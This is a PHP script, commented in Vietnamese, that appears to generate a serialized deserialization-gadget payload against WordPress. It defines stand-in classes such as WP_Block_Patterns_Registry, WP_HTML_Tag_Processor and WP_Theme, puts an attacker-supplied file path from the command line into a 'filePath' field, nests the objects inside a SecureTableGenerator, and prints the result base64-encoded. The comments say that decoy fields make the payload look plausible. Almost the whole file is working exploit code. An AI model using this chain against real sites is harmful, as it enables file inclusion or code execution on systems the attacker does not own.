<?php
namespace {

    class WP_HTML_Tag_Processor {
        public $html = "init";
        public $parsing_namespace = 'html';
        public $attributes;
        public $classname_updates = [1];

        public function __construct($attrs) {
        $this->html = "foobar";          // Mỗi khi khởi tạo thì $html thành “foobar”
        $this->attributes = $attrs;      // Gán object (ở đây là WP_Block_List) vào
    }
    }

    class WP_Block_List {
        public $blocks;      // Lưu một số thông tin block
        public $registry;    // Nơi giữ reference tới Registry

        public function __construct($reg) {
            // Thêm một block giả cho payload nhìn hợp lý
            $this->blocks = ['class' => ['blockName'=> 'test', 'extra' => 'keep']];
            $this->registry = $reg;         
        }
    }
    //WP_Block_List là nút trung gian để giữ WP_Block_Patterns_Registry

    final class WP_Block_Patterns_Registry {
        public $registered_patterns;   // Danh sách patterns (chứa payload)

        public function __construct($file) {
            // Thêm payload vào key filePath
            $this->registered_patterns = [
                'test' => [
                    'filePath' => $file,             // Đây chính là payload từ script khác truyền vào
                    'meta'     => ['timestamp' => time()] // Noise cho phức tạp
                ]
            ];
        }
    }

    class WP_Query {
        public $compat_methods;
        public function __construct($c) {
            $this->compat_methods = $c;  
        }
    }

    class WP_Theme {
        public $headers;
        public function __construct($h) {
            $this->headers = $h;  
        }
    }

    class SecureTableGenerator {
        private $allowedTags;   
        private $headers;
        private $tableClass;
        private $data;

        public function __construct($tags) {
            $this->allowedTags = $tags;  
        }
    }

    $payloadPath = $argv[1];

    $registry   = new WP_Block_Patterns_Registry($payloadPath);
    $blockList  = new WP_Block_List($registry);
    $processor  = new WP_HTML_Tag_Processor($blockList);
    $query      = new WP_Query(['foo' => 'bar']);
    $theme      = new WP_Theme(['Author' => 'Truong']);
    $SecureTableGenerator = new SecureTableGenerator([$processor, $query, $theme]);

    echo base64_encode(serialize($SecureTableGenerator));
}
?>